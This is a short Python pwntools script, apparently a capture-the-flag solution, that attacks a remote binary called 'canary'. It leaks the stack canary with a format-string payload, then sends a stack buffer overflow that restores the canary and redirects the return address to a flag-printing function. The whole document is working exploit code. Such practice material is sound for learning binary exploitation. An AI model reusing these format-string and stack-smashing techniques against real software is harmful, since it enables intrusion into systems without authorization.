#!/usr/bin/env python3
from pwn import *

BIN  = "./canary"
IP   = "141.85.224.106"
PORT = "31342"

context.bits = 64
context.endian = 'little'
context.binary = BIN
context.log_level = 'debug'
# io = process(BIN)
io = remote(IP, PORT)

# To get the flag
flaggy = 0x400716

# Get junk
io.recv()

# Send payload to print canary
io.send(b"y " + b"%9$llx>> " + b"\n")

# Recv until >> and extract the canary
to_process = io.recvuntil(b">> ")
canary = int(b"0x" + (to_process[-19:-3]), 16)

# Recv the rest of the output
io.recv()

# Send payload with canary and overwrite address to call flaggy
io.send(b"n".ljust(24, b"\x41") + p64(canary) + b"B" * 8 + p64(flaggy) + b"\n")

# Get the flag
io.interactive()
